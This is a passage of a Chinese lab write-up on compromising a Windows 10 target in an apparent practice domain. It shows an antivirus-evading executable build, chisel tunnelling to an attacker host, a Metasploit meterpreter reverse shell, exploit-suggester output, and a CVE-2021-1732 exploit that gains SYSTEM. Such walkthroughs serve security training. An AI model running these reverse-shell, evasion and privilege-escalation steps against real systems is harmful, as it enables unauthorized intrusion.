(ZlibArchive) D:\_Code\test\build\Bypass_AV-20250203\PYZ-00.pyz completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4381 INFO: checking PKG</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4381 INFO: Building PKG because PKG-00.toc is non existent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4381 INFO: Building PKG (CArchive) Bypass_AV-20250203.pkg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5786 INFO: Building PKG (CArchive) Bypass_AV-20250203.pkg completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5787 INFO: Bootloader D:\_Code\test\env\Lib\site-packages\PyInstaller\bootloader\Windows-64bit-intel\runw.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5787 INFO: checking EXE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5787 INFO: Building EXE because EXE-00.toc is non existent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5787 INFO: Building EXE from EXE-00.toc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5788 INFO: Copying bootloader EXE to D:\_Code\test\dist\Bypass_AV-20250203.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6023 INFO: Copying icon to EXE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6145 INFO: Copying 0 resources to EXE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6145 INFO: Embedding manifest in EXE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6270 INFO: Appending PKG archive to EXE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6278 INFO: Fixing EXE headers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">6330 INFO: Building EXE from EXE-00.toc completed successfully.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>上传至靶机之后，先添加端口转发和监听器</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Centos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:4444:127.0.0.1:4444 &amp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[3] 36534</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 20:42:45 client: Connecting to ws://192.168.200.128:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 20:42:45 client: tun: proxy#4444=&gt;4444: Listening</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 20:42:45 client: Connected (Latency 1.042155ms)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># kali</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) set lhost 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lhost =&gt; 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set lport 4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lport =&gt; 4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>执行文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20250240-204033-671ab33059f58a873cbf1673432ccec4.png" width="1545" height="1044" class="img_ev3q"></p>
<p>成功上线</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Sending stage (203846 bytes) to 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Meterpreter session 5 opened (127.0.0.1:4444 -&gt; 127.0.0.1:34504) at 2025-02-03 20:42:55 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; sysinfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Computer        : WIN10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OS              : Windows 10 (10.0 Build 18363).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Architecture    : x64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System Language : zh_CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain          : VULNTARGET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Logged On Users : 6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Meterpreter     : x64/windows</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win10-提权">win10 提权<a href="#win10-提权" class="hash-link" aria-label="win10 提权的直接链接" title="win10 提权的直接链接">​</a></h2>
<p>先进行探测</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 10.0.20.66 - Collecting local exploits for x64/windows...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 10.0.20.66 - 198 exploit checks are being tried...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/bits_ntlm_token_impersonation: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_1313_system_orchestrator: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 10.0.20.66 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running check method for exploit 47 / 47</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 10.0.20.66 - Valid modules for session 5:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #   Name                                                           Potentially Vulnerable?  Check Result</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> -   ----                                                           -----------------------  ------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 1   exploit/windows/local/bits_ntlm_token_impersonation            Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 7   exploit/windows/local/cve_2020_0796_smbghost                   Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 9   exploit/windows/local/cve_2020_1313_system_orchestrator        Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 10  exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 11  exploit/windows/local/cve_2020_17136                           Yes                      The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 12  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 13  exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 14  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 15  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 16  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 17  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 18  exploit/windows/local/bypassuac_comhijack                      No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 19  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 21  exploit/windows/local/capcom_sys_exec                          No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 22  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 23  exploit/windows/local/cve_2020_1054_drawiconex_lpe             No                       The target is not exploitable. No target for win32k.sys version 10.0.18362.387</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 24  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 25  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 26  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 27  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 28  exploit/windows/local/cve_2024_30088_authz_basep               No                       The target is not exploitable. Version detected: Windows 10+ Build 18363</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 29  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 30  exploit/windows/local/ikeext_service                           No                       The check raised an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 32  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows 10 (10.0 Build 18363). is not vulnerable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 33  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 34  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 35  exploit/windows/local/ms15_078_atmfd_bof                       No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 36  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 37  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 38  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 39  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 40  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 41  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 42  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 43  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 44  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 45  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 46  exploit/windows/local/webexec                                  No                       The check raised an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 47  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试进行自动化利用，但是失败</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/windows/local/cve_2022_21882_win32k</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/cve_2022_21882_win32k) &gt; set lhost 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lhost =&gt; 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/cve_2022_21882_win32k) &gt; set lport 4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lport =&gt; 4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/cve_2022_21882_win32k) &gt; set session 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session =&gt; 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/local/cve_2022_21882_win32k) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] The target appears to be vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Launching msiexec to host the DLL...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Process 1364 launched.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Reflectively injecting the DLL into 1364...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Exploit completed, but no session was created.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试手动 <a href="https://github.com/linuxdy/CVE-2021-1732_exp" target="_blank" rel="noopener noreferrer">linuxdy/CVE-2021-1732_exp</a> 进行利用，记得使用 shelcode 进行免杀</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Process 4348 created.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Channel 1 created.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows [�汾 10.0.18363.418]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(c) 2019 Microsoft Corporation����������Ȩ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\Public&gt;.\CVE-2021-1732_exploit.exe whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\CVE-2021-1732_exploit.exe whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">�밴���������. . .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CreateWnd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:000200ba   qwfirstEntryDesktop=00000237C4B915B0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B91000   RegionSize=:0000000000003000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:000200bc   qwfirstEntryDesktop=00000237C4B91770</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B91000   RegionSize=:0000000000003000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:000200b4   qwfirstEntryDesktop=00000237C4B93C80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B93000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:000200f0   qwfirstEntryDesktop=00000237C4B93E20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B93000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:000600d6   qwfirstEntryDesktop=00000237C4B93FE0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B93000   RegionSize=:0000000000002000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:00050088   qwfirstEntryDesktop=00000237C4B941A0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B94000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:00060064   qwfirstEntryDesktop=00000237C4B94360</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B94000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:00020094   qwfirstEntryDesktop=00000237C4B94520</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B94000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:00020096   qwfirstEntryDesktop=00000237C4B946E0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B94000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hwnd:00020098   qwfirstEntryDesktop=00000237C4B948A0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BaseAddress:00000237C4B94000   RegionSize=:0000000000001000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Min BaseAddress:00000237C4B91000   RegionSize=:0000000000003000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MagciHwnd==0000000000030098</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">realMagicHwnd=0000000000030098</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dwRet=00000000000018E0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tagWndMin_offset_0x128=00000000000018E0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">g_qwExpLoit=FFFFBDDF40822D20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwFrist read=FFFFBDDF40833BD0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwSecond read=FFFFDA8E02CF96A0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwSecond read=FFFFBDDF426E0000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwFourth read=FFFFBDDF428F0010</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwFifth read=FFFFDA8E02BC7080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qwSixth read=FFFFDA8E041EE0C0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Trying to execute whoami as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] ProcessCreated with pid 5632!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===============================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nt authority\system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">�밴���������. . .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>提权可行的话，直接上线 msf</p>
